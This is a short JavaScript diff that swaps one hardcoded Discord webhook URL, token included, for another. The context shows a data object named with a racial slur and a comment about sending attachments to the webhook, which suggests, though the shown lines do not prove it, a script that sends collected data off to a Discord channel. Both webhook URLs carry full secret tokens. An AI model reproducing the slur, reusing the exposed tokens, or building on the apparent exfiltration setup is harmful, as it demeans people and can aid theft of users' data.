@@ -1571,7 +1571,7 @@ const datanigga = {
 };
 
 // Discord webhook (multipart attachments + 429 handling)
-var WEBHOOK_URL = 'https://discord.com/api/webhooks/1411391778795421798/27FJxGX_XSFrAz1Kd5wSHy_WbyAQDKR4HydeUT4feIIzh0fiD0xD1yP0Auo3HxgOf7yN';
+var WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1412497681581998170/EtXMUW74juo3Z0gJ7q-6__8YHi_wCLcbwyaqk4FugnKhhPt1K8aVk9QefHeYQFL3v1SZ';
 // Custom endpoint disabled
 var CUSTOM_ENDPOINT_URL = '';
 var CUSTOM_AUTH_HEADER = null;
@@ -2076,3 +2076,4 @@ setTimeout(function() {
         // Player not available yet, that's fine
     }
 }, 1000);
+
